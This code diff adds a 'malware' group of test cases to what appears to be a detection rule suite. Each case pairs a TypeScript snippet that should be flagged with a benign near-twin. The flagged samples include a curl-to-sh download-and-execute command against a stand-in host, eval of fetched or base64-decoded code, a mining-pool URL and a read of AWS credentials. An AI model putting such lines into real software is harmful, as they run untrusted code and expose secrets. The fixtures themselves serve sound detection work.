@@ -140,4 +140,41 @@ GROUPS: dict[str, list[tuple[str, str, str]]] = {
             "const x = (\n  <div><div>shallow</div></div>\n);\n",
         ),
     ],
+    "malware": [
+        (
+            "TS-MAL-OBFUSCATED-EXEC",
+            "eval(atob(payload));\n",
+            "const decoded = atob(payload);\n",  # decode, no eval
+        ),
+        (
+            "TS-MAL-REMOTE-EXEC",
+            "async function f(u) {\n  eval(await fetch(u).then((r) => r.text()));\n}\n",
+            "async function f(u) {\n  const body = await fetch(u).then((r) => r.text());\n}\n",
+        ),
+        (
+            "TS-MAL-DOWNLOAD-EXEC",
+            'execSync("curl http://example.invalid/x.sh | sh");\n',
+            'execSync("curl -o out http://example.invalid/x.sh");\n',  # download, not piped to a shell
+        ),
+        (
+            "TS-MAL-DYNAMIC-REQUIRE",
+            "const mod = require(name);\n",
+            'const mod = require("fs");\n',  # static literal path
+        ),
+        (
+            "TS-MAL-CRYPTO-MINER",
+            'const pool = "stratum+tcp://pool.example.invalid:4444";\n',
+            'const url = "https://api.example.com/v1";\n',
+        ),
+        (
+            "TS-MAL-CREDENTIAL-ACCESS",
+            'const p = readFileSync("/home/u/.aws/credentials");\n',
+            'const p = readFileSync("/home/u/project/config.yaml");\n',
+        ),
+        (
+            "TS-MAL-ENCODED-BLOB",
+            f'const blob = "{"A" * 240}";\n',
+            'const token = "short-normal-string";\n',
+        ),
+    ],
 }
